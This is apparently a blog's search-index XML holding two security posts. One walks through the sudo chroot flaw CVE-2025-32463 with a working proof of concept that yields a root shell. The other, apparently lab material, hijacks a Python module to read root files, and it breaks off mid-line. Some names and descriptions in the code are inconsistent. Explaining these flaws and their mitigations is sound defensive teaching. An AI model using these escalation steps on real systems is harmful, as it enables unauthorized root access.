<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Breaking Out with chroot: CVE-2025-32463 in Sudo</title>
      <link href="/2025/07/13/chwoot/"/>
      <url>/2025/07/13/chwoot/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/chwoot/image.png" alt="alt text"></p><h1 id="OERVIEW"><a href="#OERVIEW" class="headerlink" title="__OERVIEW"></a>__OERVIEW</h1><p>In this post, we dive into <strong>CVE-2025-32463</strong>, a recently disclosed vulnerability in Sudo’s <code>-R</code> (<code>--chroot</code>) option  that allows local privilege escalation by abusing <code>chroot</code> in combination with how <code>nsswitch</code> resolves system resources. Discovered by <strong>Rich Mirch</strong>, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an <code>/etc/nsswitch.conf</code> file under the user-specified root directory. &lt;! read-more&gt;</p><span id="more"></span><hr><h2 id="Introduction-to-chroot"><a href="#Introduction-to-chroot" class="headerlink" title="Introduction to chroot"></a>Introduction to chroot</h2><p>The <code>chroot</code>  Option (<strong>short for change root</strong>) is a linux  sudo command that changes the apparent root directory (<code>/</code>) for the current running process and its children.</p><p>The <em>chroot(2)</em> system call and <em>chroot(8)</em> commands  within  are used to limit the files and directories a process can access on a given file system. This is done by changing the root directory of the process to a given path, restricting its view to files under the path. It essentially puts the process in a <strong>“jail”</strong> </p><p>by default any user can specify a chroot directory, to confirm this we can this command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure><p>A value of “*” in the <em>runchroot&#x3D; sudoers</em> configuration indicates that our lowpriv user may specify the root directory by running <em>sudo</em> with the -R option. An example configuration using this option is shown below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lowpriv on prod:</span><br><span class="line">    env_reset,</span><br><span class="line">    mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty,</span><br><span class="line">    runchroot=*</span><br><span class="line">    User lowpriv may run the following commands on prod:</span><br><span class="line">    (root) /bin/bash</span><br><span class="line">lowpriv@prod:~$ sudo -R /web /bin/bash</span><br><span class="line">bash-5.2#</span><br></pre></td></tr></table></figure><h4 id="Creating-a-jail-environment"><a href="#Creating-a-jail-environment" class="headerlink" title="Creating a jail environment"></a>Creating a jail environment</h4><p>To function properly within a chroot jail, the target directory must contain <strong>all required binaries and libraries</strong> needed by chroot such as a shell inside a  bin folder (<code>/bin/bash</code>) and essential shared libraries (like <code>libc</code>, <code>libm</code>, etc.). Without these, the environment may fail to start or function correctly.</p><p>Below is an example  Sudo rule. The lowpriv account is allowed to execute <code>/bin/bash</code> under <code>/web</code>. In this example rule, the user does not pass the chroot directory using the command-line options. Instead, Sudo will <code>chroot</code> to <code>/web</code> prior to executing <code>/bin/bash</code>. Meaning <code>/web</code> becomes bash’s root directory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot=/web /bin/bash</span><br><span class="line">after ch:</span><br><span class="line">/web/bin/bash</span><br></pre></td></tr></table></figure><p>When the command is executed via Sudo, the root path will be set to <code>/web</code>, so<code> /web/bin/bash</code> must exist along with any linked libraries. The example below of <code>lsof</code> command output shows the lowpriv user running <code>/bin/bash</code> under <code>/web</code> via <code>rtd</code>: (short for root dir).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot /web /bin/bash</span><br><span class="line">$ lsof </span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME </span><br><span class="line">bash    160095 root  cwd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  rtd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash </span><br><span class="line">bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 </span><br></pre></td></tr></table></figure><p>The <code>rtd</code> entry in <code>lsof</code> confirms that the <strong>root directory</strong> (<code>/</code>, from the perspective of the process) has been <strong>changed using <code>chroot</code></strong>, and is now pointing to <code>/web</code>.</p><p>Additionally, commands like <code>ls</code> or <code>cd</code> won’t work because their binaries were not copied to  the chroot environment: <code>/web</code> , so they simply don’t exist in that directory.</p><h2 id="The-nsswitch-configuration-file"><a href="#The-nsswitch-configuration-file" class="headerlink" title="The nsswitch configuration file"></a>The nsswitch configuration file</h2><p><code>nsswitch.conf</code> (short for <strong>Name Service Switch</strong>) is a configuration file in linux   located at <code>/etc/nsswitch.conf</code>. nsswitch tells the system <strong>how to resolve names and look up various types of information</strong>  such as usernames, hostnames, groups, passwords, and more.</p><h4 id="Inside-the-config-file"><a href="#Inside-the-config-file" class="headerlink" title="Inside the config file"></a>Inside the config file</h4><p>The following <code>nsswitch.conf</code> entries define where the system should look when resolving various types of information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passwd:     files systemd</span><br><span class="line">group:      files</span><br><span class="line">shadow:     files</span><br><span class="line">hosts:      files dns</span><br><span class="line">networks:   files</span><br></pre></td></tr></table></figure><p>Each line has the format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;database&gt;: &lt;source1&gt; [&lt;source2&gt; ...]</span><br></pre></td></tr></table></figure><p>For example:</p><ul><li><code>hosts: files dns</code><br>  → When resolving hostnames (e.g., for <code>ping google.com</code>), check:<ol><li><code>/etc/hosts</code> (<code>files</code>)</li><li>DNS servers (<code>dns</code>)<br>a little detail here</li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd: files ldap</span><br></pre></td></tr></table></figure><p><code>files</code> mean that the system will first look for <code>passwd</code> in the <code>/etc</code> directory. The <code>ldap</code>  after refers to the ldap source which translates  to the shared library: <code>libnss_ldap.so</code>. That’s how NSS dynamically loads the appropriate library based on the source name.</p><p>A <strong>library</strong> is a collection of precompiled code that can be reused by programs. There are two main types:</p><ul><li><p><strong>Static libraries</strong> (<code>.a</code> files)</p><ul><li>Linked into the program at <strong>compile time</strong></li><li>Code becomes part of the final binary</li><li>No external dependency at runtime</li></ul></li><li><p><strong>Shared libraries</strong> (<code>.so</code> files — <strong>shared objects</strong>)</p><ul><li>Linked at <strong>runtime</strong>, not baked into the binary</li><li>Multiple programs can share a single copy in memory</li></ul></li></ul><h2 id="CVE-2025-32463-chwoot"><a href="#CVE-2025-32463-chwoot" class="headerlink" title="CVE-2025-32463 (chwoot)"></a>CVE-2025-32463 (chwoot)</h2><h3 id="Sudo-chroot-Elevation-of-Privilege-Walkthrough"><a href="#Sudo-chroot-Elevation-of-Privilege-Walkthrough" class="headerlink" title="Sudo chroot Elevation of Privilege Walkthrough"></a>Sudo chroot Elevation of Privilege Walkthrough</h3><p>CVE-2025-32463 was introduced in <code>Sudo v1.9.14</code> (June 2023) with the update to the <em>command matching handling code</em> when the chroot feature is used.<br>from update notes:<br><em>Improved command matching when a chroot is specified in sudoers. The sudoers plugin will now change the root directory id needed before performing command matching. Previously, the root directory was simply prepared to the path that was being processed.</em></p><p>The issue arises from allowing an unprivileged user to invoke <em>chroot()</em> on a writable, untrusted path under their control. Sudo calls <em>chroot()</em> several times, regardless of whether the user has corresponding Sudo rule configured.</p><p>Allowing a low-privileged user the ability to call <em>chroot()</em> with root authority to a writable location can have various security risks.</p><h3 id="nsswitch-abuse"><a href="#nsswitch-abuse" class="headerlink" title="nsswitch abuse"></a>nsswitch abuse</h3><p>One interesting note that may not be immediately apparent when reading the <em>nsswitch.conf</em> file is that the name of the source is also used as part of the path for a shared object (library). For example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd:         files ldap</span><br><span class="line">group:          files ldap</span><br></pre></td></tr></table></figure><p>the above <em>ldap</em> source translates to <code>libnss_ldap.so</code>. When an NSS function uses the <em>ldap</em> source, the library is loaded.</p><p>Because of this behavior,  <strong>any local user can trick Sudo into loading  an arbitrary shared object</strong>, via our own <code>nsswitch</code> that we put inside the chroot directory as <code>/web/etc/nsswitch.conf</code>,  resulting in arbitrary code execution as root. </p><p>To exploit this issue, the following <em>&#x2F;etc&#x2F;nsswitch.conf</em> file was placed inside of the chrooted environment. The <em>&#x2F;vipa0z</em> NSS “source” is translated to <em>libnss</em>&#x2F;vipa0z.so.2, which is a shared object under a path we control.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd: /vipa0z</span><br></pre></td></tr></table></figure><p>The folllowing stack trace shows the malicious shared object that has been loaded by Sudo. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#0  0x0000763a155db181 in woot () from libnss_/vipa0z.so.2</span><br><span class="line">#1  0x0000763a1612271f in call_init</span><br><span class="line">#8  0x0000763a1612a164 in _dl_open (file=&quot;libnss_/vipa0z.so.2&quot;, </span><br><span class="line">#14 0x0000763a15f53a0f in module_load</span><br><span class="line">#15 0x0000763a15f53ee5 in __nss_module_load</span><br><span class="line">#17 0x0000763a15f5460b in __GI___nss_lookup_function</span><br><span class="line">#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2</span><br><span class="line">#20 0x0000763a15f62628 in __getpwnam_r </span><br><span class="line">#21 0x0000763a15d59ae8 in pam_modutil_getpwnam</span><br><span class="line">#27 0x0000763a15d58d99 in pam_acct_mgmt</span><br><span class="line">#28 0x0000763a1577e491 in sudo_pam_approval</span><br></pre></td></tr></table></figure><p><img src="/../images/chwoot/2.png" alt="exploit map"></p><h2 id="The-exploit"><a href="#The-exploit" class="headerlink" title="The exploit"></a>The exploit</h2><p>with all the ABC out of the way, now for the fun part:<br>let’s start by grapping this  PoC, written by <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">pr0v3rbst</a> and begin to dissect it<br>This exploit utilizes a shared library object (<code>.so</code>) to create a bash process running as the root user</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; vipa0z.c&lt;&lt;EOF</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">woot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>We begin by defining a <strong>constructor function</strong> in C, a special function marked to execute <strong>before <code>main()</code> runs</strong>. Inside this constructor, the process’s <strong>effective user ID and group ID</strong> (<code>euid</code> and <code>egid</code>) are both set to <code>0</code>, giving the process <strong>root-level privileges</strong>.</p><p>Next, the code calls <code>chroot(&quot;/&quot;)</code>, effectively <strong>breaking out of the chroot jail</strong> by resetting the root directory back to the actual system root (<code>/</code>). This bypasses the restricted environment (e.g., <code>/web</code>) and restores full access to the real filesystem.</p><h3 id="nsswitch"><a href="#nsswitch" class="headerlink" title="nsswitch"></a>nsswitch</h3><p>we then <strong>Create a fake <code>nsswitch.conf</code></strong> inside the <code>woot</code> directory and inject the following line:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo &quot;passwd: /vipa0z&quot; &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line">echo &quot;woot!&quot;</span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125;</span><br></pre></td></tr></table></figure><p>This instructs the system to treat <code>/vipa0z</code> as the NSS source when resolving user account information (like <code>/etc/passwd</code>). When the system sees this entry, it will attempt to load a shared object named <code>libnss_vipa0z.so</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/group /web/etc</span><br></pre></td></tr></table></figure><p><strong>Copy <code>/etc/group</code></strong> into the jail so group lookups don’t fail when the process runs in chroot.</p><ul><li><strong>Compile the shared object</strong> (<code>vipa0z.c</code>) into a <code>.so</code> file and move it to a <code>/libnss_</code> directory (the <em>lib</em> folder)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -Wl,-init,web -o libnss_/vipa0z.so.2 vipa0z.c</span><br></pre></td></tr></table></figure><p>Executing on Ubuntu 24.04.2 LTS server with <code>Sudo v1.9.15p5</code>, using an unprivileged user with no Sudo rules defined, results in a root shell outside of the chrooted environment.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~/CVE-2025-32463$ id</span><br><span class="line">uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ sudo -l</span><br><span class="line">[sudo] password for lowpriv:</span><br><span class="line">Sorry, user lowpriv may not run sudo on prod.</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh</span><br><span class="line">woot!</span><br><span class="line">root@prod:/# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(lowpriv)</span><br></pre></td></tr></table></figure><h2 id="the-sudo-Patch"><a href="#the-sudo-Patch" class="headerlink" title="the sudo Patch?"></a>the sudo Patch?</h2><p>The patch essentially reverts to the changes implemented in <code>Sudo 1.9.14</code>. The <em>pivot_root()</em> and <em>unpivot_root()</em> functions were removed, and <em>chroot()</em> is no longer called during the command matching phase.</p><p>With the patch applied, the exploit fails because <em>chroot()</em> is no longer called.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh</span><br><span class="line">woot!</span><br><span class="line">sudo: the -R option will be removed in a future version of sudo</span><br><span class="line">Password:</span><br><span class="line">sudo: you are not permitted to use the -R option with woot</span><br></pre></td></tr></table></figure><h1 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h1><ul><li>Install the latest sudo packages for your system. No workaround exists for this issue.</li><li>The chroot option is now deprecated as of 1.9.17p1. It is recommended to avoid using the chroot options, as this could unintentionally make your environment less secure if not implemented properly.</li><li>Search your environment for any use of the chroot option. Review all Sudo rules defined in &#x2F;etc&#x2F;sudoers, and files under &#x2F;etc&#x2F;sudoers.d. If the Sudo rules are stored in LDAP, use tools such as ldapsearch to dump the rules.</li><li>Look for the use of the runchroot&#x3D; option or CHROOT&#x3D;</li><li>You can search for sudo entries in the syslog. Any commands using chroot will be logged with the CHROOT&#x3D;</li></ul><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">stratascale.com&#x2F;vulnerability-alert-CVE-2025-32463-sudo-chroot</a><br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32462">nvd.nist.gov&#x2F;CVE-2025-32462</a><br><a href="https://www.sudo.ws/security/advisories/chroot_bug/">www.sudo.ws/advisories/chroot_bug&#x2F;</a><br><a href="https://www.youtube.com/watch?v=9nRr3R9gEb8&t=307s">https://www.youtube.com/watch?=low-level-code/sudo-chwoot</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hijacking Python Modules</title>
      <link href="/2025/07/12/attacking%20python%20libraries/"/>
      <url>/2025/07/12/attacking%20python%20libraries/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/python3122.png" alt="alt text"></p><h1 id="OVERVIEW"><a href="#OVERVIEW" class="headerlink" title="_OVERVIEW"></a>_OVERVIEW</h1><p>Python has <a href="https://docs.python.org/3/library/">the Python standard library</a>, with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs.</p><span id="more"></span><h4 id="Importing-Modules"><a href="#Importing-Modules" class="headerlink" title="Importing Modules"></a>Importing Modules</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Method 1</span></span><br><span class="line"><span class="keyword">import</span> pandas</span><br><span class="line"></span><br><span class="line"><span class="comment"># Method 2</span></span><br><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Method 3</span></span><br><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> Series</span><br></pre></td></tr></table></figure><p>There are many ways in which we can abuse a Python library to PrivEsc. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:</p><ol><li>Wrong write permissions</li><li>Library Path</li><li>PYTHONPATH environment variable</li></ol><hr><h2 id="Wrong-Write-Permissions"><a href="#Wrong-Write-Permissions" class="headerlink" title="Wrong Write Permissions"></a>Wrong Write Permissions</h2><p>For example, we can imagine that we are in a developer’s host and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.</p><p>One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If <code>SUID</code>&#x2F;<code>SGID</code> permissions have been assigned to the Python script that imports this module, our code will automatically be included.</p><p>If we look at the set permissions of the <code>mem_status.py</code> script, we can see that it has a <code>SUID</code> set.</p><p>Checking our sudo privileges reveals a python script that we can with elevated permissions.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crytix@ubuntu:~$ sudo -l </span><br><span class="line">Matching Defaults entries for htb-student on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User crytix may run the following commands on ubuntu:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py</span><br><span class="line">htb-student@ubuntu:~$ </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crytix@ubuntu:~$ ls -la mem_status.py </span><br><span class="line">-rwSrwxr-x 1 root root 192 May 19  2023 mem_status.py</span><br></pre></td></tr></table></figure><p>![[Pasted image 20250712203305.png]]<br><code>r-x</code><br>By analyzing the permissions over the <code>mem_status.py</code> Python file, we understand that we can execute this script and we also have permission to view the script, and read its contents.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line"></span><br><span class="line">available_memory = psutil.virtual_memory().available * <span class="number">100</span> / psutil.virtual_memory().total</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Available memory: <span class="subst">&#123;<span class="built_in">round</span>(available_memory, <span class="number">2</span>)&#125;</span>%&quot;</span>)</span><br></pre></td></tr></table></figure><p>We can also see in the second line that this script imports the module <code>psutil</code> and uses the function <code>virtual_memory()</code>.</p><p>So we can look for this function in the folder of <code>psutil</code> and check if this module has write permissions for us.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crytix@lpenix:~$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*</span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br><span class="line"></span><br><span class="line">-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /usr/local/lib/python3.8/dist-packages/psutil/__init.py</span></span><br></pre></td></tr></table></figure><p>in vim<br>press <code>/</code> to search and write the method defintion (<code>virtual_memory()</code>)<br><code>/def virtual_memory</code><br>![[Pasted image 20250712202409.png]]<br>Now lets insert our malicious code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment">#### Hijacking</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /root/flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> _TOTAL_PHYMEM</span><br><span class="line">    ret = _psplatform.virtual_memory()</span><br><span class="line">    <span class="comment"># cached for later use in Process.memory_percent()</span></span><br><span class="line">    _TOTAL_PHYMEM = ret.</span><br></pre></td></tr></table></figure><p>press <code>esc</code> + <code>:</code> + <code>wq!</code></p><p>forcing sudo to execute the command when apparmor or filesystem&#x2F;wrappers are intercepting</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">sudo</span> -u root /usr/bin/python3 /home/htb-student/mem_status.py</span></span><br><span class="line">HTB&#123;3xpl0xxxxxxxx4ry_HIjiNX&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Library-Path-Abuse"><a href="#Library-Path-Abuse" class="headerlink" title="Library Path Abuse"></a>Library Path Abuse</h2><p>In Python, each version has a specified order in which libraries (<code>modules</code>) are searched and imported from. The order in which Python imports <code>modules</code> from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:</p><p>uming all contain a file named <code>mymodule.py</code>.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">example_project/</span><br><span class="line">├── main.py                  # Your main script</span><br><span class="line">├── mymodule.py              # [Priority #<span class="number">1</span>] Local <span class="title function_ invoke__">module</span> (script directory)</span><br><span class="line">├── custom_dir/              # [Priority #<span class="number">2</span> <span class="keyword">if</span> added manually to sys.path]</span><br><span class="line">│   └── mymodule.py</span><br><span class="line">├── venv/                    # [Priority #<span class="number">3</span>] Virtual environment site-packages</span><br><span class="line">│   └── lib/</span><br><span class="line">│       └── python3.x/</span><br><span class="line">│           └── site-packages/</span><br><span class="line">│               └── mymodule.py</span><br><span class="line">└── system/</span><br><span class="line">    └── python3.x/</span><br><span class="line">        └── lib/</span><br><span class="line">            └── mymodule.py  # [Lowest priority] Global standard library or installed packages</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Path-Listing"><a href="#Path-Listing" class="headerlink" title="Path Listing"></a>Path Listing</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&#x27;import sys; print(&quot;\n&quot;.join(sys.path))&#x27;</span></span><br><span class="line"></span><br><span class="line">/usr/lib/python38.<span class="built_in">zip</span></span><br><span class="line">/usr/lib/python3<span class="number">.8</span></span><br><span class="line">/usr/lib/python3<span class="number">.8</span>/lib-dynload</span><br><span class="line">/usr/local/lib/python3<span class="number">.8</span>/dist-packages</span><br><span class="line">/usr/lib/python3/dist-packages</span><br><span class="line">/usr/lib/python3/dist-packages/sys* </span><br></pre></td></tr></table></figure><p>Notice how the <code>sys</code> module is located under one of the lower priority paths listed via the <code>PYTHONPATH</code> variable.</p><p>Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. </p><p>Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.</p><p>In order to exploit this We must have write permissions to one of the paths having a higher priority on the list.</p><p> let us continue with the previous example and show how this can be exploited. Previously, the <code>psutil</code> module was imported into the <code>mem_status.py</code> script. We can see <code>psutil</code>‘s default installation location by issuing the following command:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crytix@lpenix:~$ pip3 show psutil</span><br><span class="line"></span><br><span class="line">Location: /usr/local/lib/python3.8/dist-packages</span><br><span class="line"></span><br><span 